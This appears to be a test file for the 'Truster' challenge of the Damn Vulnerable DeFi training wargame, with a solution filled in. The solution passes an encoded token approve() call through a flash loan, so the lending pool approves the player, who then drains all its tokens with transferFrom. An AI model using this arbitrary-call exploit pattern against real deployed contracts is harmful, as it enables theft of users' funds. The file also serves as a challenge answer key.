const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        //just starting my hacking. I think my play is to approve the token to be spent by calling
        //trusterlender pool then approve the DV token to be spent. then in the second transaction. we will drain
        //console.log("tokenIFace:", token.interface)
        const poolBalance = await token.balanceOf(pool.address)
        console.log("poolBalance:", poolBalance)
        const hackedData = token.interface.encodeFunctionData("approve", [player.address, poolBalance]);
        //console.log("hackedData:", hackedData)
        console.log("pooladdress:", pool.address)
        //console.log("address(pool)", address(pool))
       // console.log("addresss(token)", address(token))
        console.log("tokenaddress:", token.address)
        await pool.connect(player).flashLoan(
            0, 
            player.address, 
            token.address, 
            hackedData
            )
        console.log('benchmark 1')
        const getAllow = await token.allowance(pool.address, player.address)
        console.log("getAllow", getAllow)
        console.log('benchmark 2')
        await token.connect(player).transferFrom(pool.address, player.address, poolBalance)
        console.log('benchmark 3')
        const playerBalance = await token.balanceOf(player.address)
        console.log("playerBalance:", playerBalance)
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

